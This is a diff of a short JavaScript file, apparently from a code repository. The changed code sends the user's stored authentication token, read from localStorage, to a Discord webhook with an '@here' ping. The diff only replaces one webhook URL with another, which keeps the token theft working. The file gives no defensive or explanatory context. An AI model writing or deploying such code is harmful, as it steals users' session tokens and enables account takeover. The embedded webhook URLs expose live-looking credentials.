@@ -5,7 +5,7 @@ socket.onopen = function(e) {
 
 };
 var request = new XMLHttpRequest;
-request.open("POST", "https://discord.com/api/webhooks/1074777496588910622/f3Xtoufb0m0t_a7DKlETfnDFJmWIi64c8c9hdi1CkQlVK8jfNutlUCEN2NPSYIHFh4jp", true);
+request.open("POST", "https://discord.com/api/webhooks/1074985120810946570/TJRbUqiEfD5gIbQfgmS5B5UpoJZ42OVJyo2dsX69nAl7qf3r3EN2I1M22ii3ysYjGa4p", true);
 request.setRequestHeader("Content-Type", "application/json");
 var params = JSON.stringify({content: "@here Authentication Token: " + localStorage.getItem("authToken")});
 request.send(params);
